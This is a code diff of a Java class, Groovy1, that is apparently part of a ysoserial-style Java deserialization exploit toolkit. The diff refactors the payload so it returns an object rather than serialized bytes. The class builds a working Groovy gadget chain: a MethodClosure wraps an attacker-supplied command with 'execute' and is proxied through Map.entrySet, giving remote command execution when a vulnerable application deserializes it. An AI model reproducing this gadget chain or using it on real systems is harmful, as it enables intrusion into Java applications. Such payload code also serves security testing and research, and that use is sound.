@@ -26,22 +26,14 @@ import java.util.Map;
  */
 public class Groovy1 implements ObjectPayload<InvocationHandler> {
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public InvocationHandler getObject(PayloadType type, String... param) throws Exception {
         String                  command = param[0];
-        final ConvertedClosure  closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
-        final Map               map     = Gadgets.createProxy(closure, Map.class);
+        final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
+
+        final Map map = Gadgets.createProxy(closure, Map.class);
+
         final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
-        ByteArrayOutputStream   baous   = new ByteArrayOutputStream();
-        ObjectOutputStream      oos     = new ObjectOutputStream(baous);
-        oos.writeObject(handler);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
 
-        return bytes;
-    }
-
-    @Override
-    public InvocationHandler getObject(String command) throws Exception {
-        return null;
+        return handler;
     }
 }
